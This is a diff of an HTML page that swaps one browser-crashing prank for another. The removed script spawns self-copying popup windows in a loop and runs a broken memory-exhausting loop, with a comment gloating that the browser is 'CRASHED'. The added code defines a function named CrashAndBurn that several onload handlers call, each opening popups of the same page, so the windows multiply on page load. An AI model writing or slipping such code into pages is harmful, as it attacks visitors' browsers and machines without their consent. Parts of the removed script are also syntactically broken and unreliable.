@@ -1,36 +1,9 @@
 <html>
   <body>
-    <p id="demo"></p>
-    <script>
-      setInterval(function() {
-        var w = window.open();
-        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
-      }, 0);
-      document.getElementById("demo").innerHTML = myFunction     
-});
-</script>
-<script type="text/javascript">    
-var txt = 1
-txt = "a";
-while(1=1){
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt += "a";
-      txt = txt * txt; //add as much as the browser can handle
-}
-//[evil laugh] BOOM! All memory used up, and it is now CRASHED!      
-    </script>
-    <h1>
-      the value for txt is:
-      <script type="text/javascript">
-        document.write(txt)
-      </script>
-    </h1>
+    <script type="text/javascript"> 
+function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
+</script> 
+<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
+  <body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
   </body>
 </html>
